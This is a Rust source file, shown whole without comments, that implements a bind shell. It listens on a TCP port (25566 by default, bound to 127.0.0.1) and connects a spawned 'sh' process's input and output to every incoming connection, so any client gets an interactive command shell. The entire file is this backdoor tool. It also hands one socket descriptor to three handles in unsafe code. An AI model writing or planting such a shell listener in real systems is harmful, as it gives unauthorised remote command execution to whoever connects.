
use std::net::{TcpListener, TcpStream};
use std::thread;
use std::env;
use std::io::{Write, Read};
use std::process::{Command, Stdio};
use std::os::unix::io::{AsRawFd, FromRawFd};

unsafe fn handle_client(mut stream: TcpStream) {
    stream.write("Got your connection\n".as_bytes()).unwrap();

    Command::new("sh")
        .stdin(Stdio::from_raw_fd(stream.as_raw_fd()))
        .stdout(Stdio::from_raw_fd(stream.as_raw_fd()))
        .stderr(Stdio::from_raw_fd(stream.as_raw_fd()))
        .spawn()
        .expect("Could not create a shell");
}

fn main() {

    let args: Vec<String> = env::args().collect();
    let mut port: i32 = 25566;

    match args.len() {
        1 => {} //No args provided, skip
        2 => {
            match args[1].to_string().parse::<i32>() {
                Ok(n) => port = n,
                Err(_) => {
                    eprintln!("Error: Invalid number!");
                    return;
                }
            };
        }
        _ => eprintln!("Error: Too many args!"),
    };

    if port > 65535 || port < 1 {
        eprintln!("Error: Port must be between 1 and 65535");
        return;
    }

    let listener = TcpListener::bind(format!("127.0.0.1:{}", port)).unwrap();

    for connection in listener.incoming() {
        match connection {
            Ok(stream) => {
                thread::spawn(|| unsafe {
                    handle_client(stream);
                });
            }
            Err(e) => panic!(e), 
        }
    }
}
